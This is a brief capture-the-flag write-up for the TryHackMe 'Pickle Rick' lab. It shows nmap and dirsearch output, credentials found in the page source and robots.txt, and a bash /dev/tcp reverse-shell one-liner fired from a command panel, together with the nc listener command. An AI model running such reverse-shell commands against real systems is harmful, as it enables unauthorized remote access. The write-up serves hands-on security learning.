#let's start

#nmap
`I found this with a basic -p- scan`
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

`this was -sC and -A scan`
┌──(kali㉿kali)-[~/TryHackMe/Pickle_Rick]
└─$ nmap -p22,80  -sC -A 10.201.0.62 --min-rate=1000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 11:50 EDT
Nmap scan report for 10.201.0.62
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:04:a0:f5:ec:bd:b2:ee:6e:ab:c2:56:2b:86:d0:a0 (RSA)
|   256 0c:82:b7:67:25:77:cd:eb:a5:2c:a1:c9:67:75:e1:44 (ECDSA)
|_  256 c2:98:8f:ba:58:40:33:61:85:40:6a:dd:e0:8d:39:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   377.11 ms 10.8.0.1
2   ... 3
4   401.02 ms 10.201.0.62

#dir
(these were the main attack vectors i found thorugh dirsearch)
[11:53:54] 200 -  455B  - /login.php
[11:54:37] 200 -   17B  - /robots.txt // contains password of the user

#you can literally go to the main page and look at the source code for the username

#login.php
`with the creds we log in and there is a command pannel, yesssss! literally command pannel so we get a reverse shell`
                       bash -c "bash -i >& /dev/tcp/your-ip/listening-port 0>&1"

  ***  FOR BEGINNERS ***
(after you login...)
FIRST = nc -lvnp (listening-port) //run this on your terminal
SECOND = bash -c "bash -i >& /dev/tcp/your-ip/listening-port 0>&1" //run this on the command pannel

`make sure to run this in this sequence as you need to start a listener[FIRST CMD] beforre firing your payloads[SECOND CMD]`
 THEN get the files from /root directory and /home/name directory 

# priv.esc
= none..  you are already root , this is a basic lab so just go and find the flags haha.
